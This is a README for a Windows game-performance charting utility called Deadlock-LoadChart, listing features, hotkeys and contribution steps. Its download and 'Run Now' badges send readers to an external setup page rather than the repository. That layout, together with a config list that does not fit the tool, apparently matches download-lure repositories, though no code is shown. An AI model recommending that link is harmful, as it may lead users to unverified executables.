# Deadlock‑LoadChart
**Real‑time game performance visualizer for Windows 10/11**

---

## 🎮 What is Deadlock‑LoadChart?

Deadlock‑LoadChart is a lightweight Windows‑only desktop utility that captures and draws live charts of CPU, GPU, memory, and thread usage while you game. It lets you see exactly where bottlenecks appear, so you can tweak settings, drivers, or background processes and keep your frame‑rates smooth.

* **Zero‑impact overlay** – renders a translucent chart on the screen without stealing focus.
* **Customizable time‑windows** – view the last 5 s, 30 s, 1 min, or 5 min of data.
* **Per‑process breakdown** – isolate the load of the active game vs. background apps.
* **Export snapshots** – copy a PNG of any chart for forums, guides, or personal logs.

---

## 📦 Download & Install

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download‑Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download">
  </a>
  &nbsp;&nbsp;
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Run‑Now%20(Portable)-green?style=for-the-badge&logo=windows" alt="Run">
  </a>
</div>

> **Note:** The utility runs natively on Windows 10 and Windows 11. No additional runtimes are required.

---

## 🚀 Quick Start

1. **Launch** the program (no installer needed).
2. **Select** the game process from the drop‑down list.
3. **Choose** the resources you want to monitor (CPU, GPU, RAM, etc.).
4. **Adjust** chart opacity, colors, and refresh rate in the Settings pane.
5. **Play** – the overlay updates in real time.

Press **F9** to toggle the overlay on/off, and **Ctrl + S** to save a snapshot.

---

## ⚙️ Features at a Glance

| Feature | Description |
|---------|-------------|
| **Live Charting** | Smooth line graphs refreshed up to 60 Hz. |
| **Multi‑core view** | Separate lines for each CPU core. |
| **GPU utilization** | Works with DirectX 11/12 and Vulkan‑based games. |
| **Memory pressure** | Shows used vs. available RAM and VRAM. |
| **Thread count** | Visualizes how many threads the game spawns. |
| **Hot‑keys** | Quick toggles for overlay, snapshots, and logging. |
| **Lightweight** | < 15 MB RAM footprint, negligible impact on FPS. |
| **Portable** | Run from a USB stick or cloud folder—no admin rights needed. |

---

## 📈 Use Cases

- **Competitive gamers** – Spot frame‑rate drops caused by background uploads.
- **Streamers** – Show live performance stats to viewers for transparency.
- **Modders** – Verify that a new utility isn’t overloading the CPU.
- **Hardware reviewers** – Capture consistent load graphs for benchmark articles.

---

## 🤝 Contributing

We welcome contributions from the community:

1. Fork the repo.
2. Create a feature branch (`git checkout -b feature/awesome‑chart`).
3. Submit a pull request with a clear description and screenshots (if UI changes).

Please follow the **Windows‑only** guideline and keep the codebase focused on real‑time charting.

---

## 📜 License

Deadlock‑LoadChart is released under the **MIT License** – feel free to use, modify, and distribute it for personal or commercial projects.

---

## 📬 Contact & Support

- **Author:** IntersectScholar
- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discussions:** Join the repository’s Discussions tab to share tips, configurations, and performance reports.

Happy gaming, and keep those frames flowing!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```